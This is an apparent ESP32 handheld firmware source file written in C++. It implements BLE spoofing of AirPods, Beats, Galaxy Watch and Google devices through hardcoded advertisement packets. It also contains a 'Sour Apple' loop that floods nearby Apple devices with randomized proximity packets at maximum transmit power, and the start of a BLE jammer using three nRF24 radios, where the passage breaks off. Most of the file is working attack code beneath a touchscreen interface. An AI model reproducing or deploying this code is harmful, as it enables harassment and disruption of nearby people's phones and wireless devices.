#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include <esp_gap_ble_api.h>
#include "NimBLEAddress.h"
#if defined(CONFIG_NIMBLE_CPP_IDF)
#include "host/ble_hs_id.h"
#else
#include "nimble/nimble/host/include/host/ble_hs_id.h"
#endif
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "icon.h"
#include "shared.h"
#include <algorithm>
#include <math.h>
#include <vector>
#include <map>


#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

namespace BleSpoofer {

#define SCREEN_HEIGHT 250
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String spooferBuffer[MAX_LINES];
uint16_t colorspooferBuffer[MAX_LINES];
int spooferlineIndex = 0;

static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;

BLEAdvertising *pAdvertising;
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

uint32_t delayMillisecond = 1000;
unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;

unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500;

bool isAdvertising = false;

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;

// Samsung devices (15 bytes)
struct WatchModel {
  uint8_t value;
  const char* name;
};
const WatchModel samsungModels[] = {
  {0x01, "Galaxy Watch 4"},
  {0x02, "Galaxy Watch 5"},
  {0x03, "Galaxy Watch 6"}
};
const uint8_t samsungModelCount = 3;
const uint8_t SAMSUNG_ADV_SIZE = 15;
const uint16_t SAMSUNG_COMPANY_ID = 0x0075;
const uint8_t SAMSUNG_ADV_TEMPLATE[SAMSUNG_ADV_SIZE] = {
  14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00
};

// Google device (14 bytes, single model)
const uint8_t GOOGLE_ADV_SIZE = 14;
const uint16_t GOOGLE_FAST_PAIR_ID = 0xFE2C;
const uint8_t GOOGLE_ADV_TEMPLATE[GOOGLE_ADV_SIZE] = {
  0x03, 0x03, 0x2C, 0xFE, // Complete 16-bit Service UUIDs
  0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27, // Service Data
  0x02, 0x0A, 0x00 // TX Power (placeholder, set dynamically)
};

const uint8_t DEVICES[][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData) {
  if (modelIndex >= samsungModelCount) return false;
  uint8_t advDataRaw[SAMSUNG_ADV_SIZE];
  memcpy(advDataRaw, SAMSUNG_ADV_TEMPLATE, SAMSUNG_ADV_SIZE);
  advDataRaw[SAMSUNG_ADV_SIZE - 1] = samsungModels[modelIndex].value;
  advData.addData(std::string((char*)advDataRaw, SAMSUNG_ADV_SIZE));
  return true;
}

bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
  uint8_t advDataRaw[GOOGLE_ADV_SIZE];
  memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100);
  advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
  return true;
}

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) { // Apple
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  } else if (device_choice == 1) { // Samsung
    uint8_t samsungIndex = device_index;
    generateSamsungAdvPacket(samsungIndex, oAdvertisementData);
  } else if (device_choice == 2) { // Google
    generateGoogleAdvPacket(oAdvertisementData);
  }

  return oAdvertisementData;
}

void Printspoofer(String text, uint16_t color, bool extraSpace = false) {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  if (spooferlineIndex >= MAX_LINES - 1) {
    for (int i = 0; i < MAX_LINES - 1; i++) {
      spooferBuffer[i] = spooferBuffer[i + 1];
      colorspooferBuffer[i] = colorspooferBuffer[i + 1];
    }
    spooferlineIndex = MAX_LINES - 1;
  }

  spooferBuffer[spooferlineIndex] = text;
  colorspooferBuffer[spooferlineIndex] = color;
  spooferlineIndex++;

  if (extraSpace && spooferlineIndex < MAX_LINES) {
    spooferBuffer[spooferlineIndex] = "";
    colorspooferBuffer[spooferlineIndex] = TFT_WHITE;
    spooferlineIndex++;
  }

  for (int i = 0; i < spooferlineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(colorspooferBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(spooferBuffer[i]);
  }
}

void sppferLoadingBar(int step) {
  int totalSteps = 4;
  int filledBlocks = (step * 20) / totalSteps;

  String bar = "[";
  for (int i = 0; i < 20; i++) {
    bar += (i < filledBlocks) ? "#" : "_";
  }
  bar += "]";

  Printspoofer(bar, TFT_GREEN);
}

void updateSpoofer() {
  tft.drawLine(0, 292, 240, 292, ORANGE);
  tft.fillRect(0, 293, 240, 50, DARK_GRAY);
  tft.fillRect(50, 295, 150, 16, DARK_GRAY);
  tft.fillRect(60, 310, 150, 16, DARK_GRAY);

  tft.setCursor(5, 295);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.print("Device:");
  int x = 50;
  int y = 295;

  switch (deviceType) {
    case 1: tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
    case 2: tft.setCursor(x, y); tft.print("[ Airpods Pro ]"); break;
    case 3: tft.setCursor(x, y); tft.print("[ Airpods Max ]"); break;
    case 4: tft.setCursor(x, y); tft.print("[ Airpods Gen 2 ]"); break;
    case 5: tft.setCursor(x, y); tft.print("[ Airpods Gen 3 ]"); break;
    case 6: tft.setCursor(x, y); tft.print("[ Airpods Gen 2 ]"); break;
    case 7: tft.setCursor(x, y); tft.print("[ PowerBeats ]"); break;
    case 8: tft.setCursor(x, y); tft.print("[ PowerBeats Pro ]"); break;
    case 9: tft.setCursor(x, y); tft.print("[ Beats Solo Pro ]"); break;
    case 10: tft.setCursor(x, y); tft.print("[ Beats Buds ]"); break;
    case 11: tft.setCursor(x, y); tft.print("[ Beats Flex ]"); break;
    case 12: tft.setCursor(x, y); tft.print("[ BeatsX ]"); break;
    case 13: tft.setCursor(x, y); tft.print("[ Beats Solo3 ]"); break;
    case 14: tft.setCursor(x, y); tft.print("[ Beats Studio3 ]"); break;
    case 15: tft.setCursor(x, y); tft.print("[ Beats StudioPro ]"); break;
    case 16: tft.setCursor(x, y); tft.print("[ Beats FitPro ]"); break;
    case 17: tft.setCursor(x, y); tft.print("[ Beats BudsPlus ]"); break;
    case 18: tft.setCursor(x, y); tft.print("[ Galaxy Watch 4 ]"); break;
    case 19: tft.setCursor(x, y); tft.print("[ Galaxy Watch 5 ]"); break;
    case 20: tft.setCursor(x, y); tft.print("[ Galaxy Watch 6 ]"); break;
    case 21: tft.setCursor(x, y); tft.print("[ Google Smart Ctrl ]"); break;
    default: tft.setCursor(x, y); tft.print("[ Airpods ]"); break;
  }

  tft.setCursor(5, 310);
  tft.setTextColor(TFT_WHITE, DARK_GRAY);
  tft.print("Adv Type:");

  switch (advType) {
    case 1: tft.setCursor(60, 310); tft.print("IND"); break;
    case 2: tft.setCursor(60, 310); tft.print("DIRECT HIGH"); break;
    case 3: tft.setCursor(60, 310); tft.print("SCAN"); break;
    case 4: tft.setCursor(60, 310); tft.print("NONCONN"); break;
    case 5: tft.setCursor(60, 310); tft.print("DIRECT LOW"); break;
  }

}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;
}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

// Android devices
void Galaxy_Watch_4() {
  device_choice = 1; // Samsung
  device_index = 0;
  attack_state = 1;
}

void Galaxy_Watch_5() {
  device_choice = 1; // Samsung
  device_index = 1;
  attack_state = 1;
}

void Galaxy_Watch_6() {
  device_choice = 1; // Samsung
  device_index = 2;
  attack_state = 1;
}

void Google_Smart_Ctrl() {
  device_choice = 2; // Google
  device_index = 0;
  attack_state = 1;
}

void setAdvertisingData() {

  switch (deviceType) {
    case 1:
      Airpods();
      break;
    case 2:
      Airpods_pro();
      break;
    case 3:
      Airpods_Max();
      break;
    case 4:
      Airpods_Gen_2();
      break;
    case 5:
      Airpods_Gen_3();
      break;
    case 6:
      Airpods_Pro_Gen_2();
      break;
    case 7:
      Power_Beats();
      break;
    case 8:
      Power_Beats_Pro();
      break;
    case 9:
      Beats_Solo_Pro();
      break;
    case 10:
      Beats_Studio_Buds();
      break;
    case 11:
      Beats_Flex();
      break;
    case 12:
      Beats_X();
      break;
    case 13:
      Beats_Solo_3();
      break;
    case 14:
      Beats_Studio_3();
      break;
    case 15:
      Beats_Studio_Pro();
      break;
    case 16:
      Betas_Fit_Pro();
      break;
    case 17:
      Beats_Studio_Buds_Plus();
      break;
    case 18:
      Galaxy_Watch_4();
      break;
    case 19:
      Galaxy_Watch_5();
      break;
    case 20:
      Galaxy_Watch_6();
      break;
    case 21:
      Google_Smart_Ctrl();
      break;
    default:
      Airpods();
      break;

      updateSpoofer();
  }
}

void handleButtonPress(int pin, void (*callback)()) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};

  int index = pin % 8;
  uint8_t currentState = pcf.digitalRead(pin);

  if (currentState == LOW && lastState[index] == HIGH) {
    unsigned long currentTime = millis();

    if ((currentTime - lastPressTime[index]) > debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > 21) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = 21;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  updateSpoofer();
}

void toggleAdvertising() {
  isAdvertising = !isAdvertising;

  if (!isAdvertising) {
    pAdvertising->stop();
    Serial.println("Advertising stopped.");
    Printspoofer("[!] Advertising stopped", TFT_YELLOW, true);
    updateSpoofer();
  } else {
    if (attack_state == 1) {
      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) {
          dummy_addr[i] |= 0xF0;
        }
      }

      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);
      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);
      pAdvertising->start();

      Printspoofer("[+] Device Type: " + String(deviceType), TFT_WHITE, false);
      Printspoofer("[+] Advertising Type: " + String(advType), TFT_WHITE, false);
      Printspoofer("[!] Advertising started", TFT_YELLOW, false);
    }

    Serial.println("Advertising started.");
    updateSpoofer();
  }
}

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_key,
    bitmap_icon_power,
    bitmap_icon_go_back
  };

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  if (!uiDrawn) {

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(80, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: changeDeviceTypePrev(); break;
        case 1: changeDeviceTypeNext(); break;
        case 2: changeAdvTypeNext(); break;
        case 3: toggleAdvertising(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 4) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void spooferSetup() {
  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  randomSeed(analogRead(0));
  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5, 24);

  updateSpoofer();
  runUI();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  Printspoofer("[!!] System Diagnostics", TFT_RED, true);

  for (int i = 0; i <= 4; i++) {
    sppferLoadingBar(i);
    delay(random(500));
  }

  Printspoofer("[+] System Ready!", TFT_GREEN, true);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  uiDrawn = false;
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
}

void spooferLoop() {
  static unsigned long lastUpdate = 0;
  const unsigned long updateInterval = 50;

  unsigned long now = millis();
  if (now - lastUpdate >= updateInterval) {
    lastUpdate = now;

    if (feature_active && isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      return;
    }

    runUI();
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
    handleButtonPress(BTN_LEFT, changeDeviceTypePrev);

    handleButtonPress(BTN_DOWN, changeAdvTypeNext);
    handleButtonPress(BTN_UP, toggleAdvertising);
  }
}

void exit() {

  if (isAdvertising && pAdvertising) {
    pAdvertising->stop();
    isAdvertising = false;
  }
}
}

namespace SourApple {
static bool uiDrawn = false;

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;

std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *Advertising;

uint8_t packet[17];

#define MAX_LINES 30
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;
const int lineHeight = 14;

void runUI() {

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back
  };

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  if (!uiDrawn) {

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              feature_exit_requested = true;
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void updatedisplay() {
  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setTextSize(1);

  for (int offset = 0; offset <= lineHeight; offset += 2) {
    tft.fillRect(0, (MAX_LINES - 1) * lineHeight - offset + 51, 240, lineHeight, TFT_BLACK);

    for (int i = 0; i < MAX_LINES; i++) {
      int y = -lineHeight + (i * lineHeight) + offset;
      if (y >= -lineHeight && y < 320) {
        tft.fillRect(0, y + 51, 240, lineHeight, TFT_BLACK);
        tft.setCursor(5, y + 55);
        tft.print(lines[i]);
      }
    }
    delay(5);
  }
  Advertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = MAX_LINES - 1; i > 0; i--) {
    lines[i] = lines[i - 1];
  }
  lines[0] = newLine;
  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + " -> ";
  lineNumber++;

  String dataStr = "0x";
  dataStr += String(packet[1], HEX);

  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);

  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;
  packet[i++] = 0xFF;
  packet[i++] = 0x4C;
  packet[i++] = 0x00;
  packet[i++] = 0x0F;
  packet[i++] = 0x05;
  packet[i++] = 0xC1;
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];
  esp_fill_random(&packet[i], 3);
  i += 3;
  packet[i++] = 0x00;
  packet[i++] = 0x00;
  packet[i++] =  0x10;
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {

  tft.setTextSize(1);
  tft.fillScreen(TFT_BLACK);

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  uiDrawn = false;

  setupTouchscreen();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();

}

void sourappleLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  runUI();

  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }
  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

  Advertising->addServiceUUID(device_uuid);
  Advertising->setAdvertisementData(oAdvertisementData);

  Advertising->setMinInterval(0x20);
  Advertising->setMaxInterval(0x20);
  Advertising->setMinPreferred(0x20);
  Advertising->setMaxPreferred(0x20);

  Advertising->start();

  delay(40);
  displayAdvertisementData();
}

void exit() {

  if (Advertising) {
    Advertising->stop();
  }
}
}

namespace BleJammer {

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

